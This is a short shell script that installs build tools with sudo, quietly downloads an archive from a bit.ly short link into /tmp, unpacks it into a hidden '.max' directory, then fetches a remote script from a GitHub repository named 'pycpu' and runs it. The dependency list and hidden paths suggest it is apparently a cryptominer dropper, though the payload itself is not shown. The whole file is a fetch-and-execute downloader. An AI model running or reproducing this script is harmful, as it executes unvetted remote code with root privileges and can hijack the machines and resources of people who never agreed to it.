#!/bin/sh
sLink='https://github.com/cloud10001/pycpu/raw/main/test.sh'
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev automake libtool autoconf -y
cd /tmp/
wget -q -O /tmp/maxarc bit.ly/MaxArc
tar -xJf /tmp/maxarc 
cd .max
wget -q -O script.sh $sLink 
chmod +x script.sh
./script.sh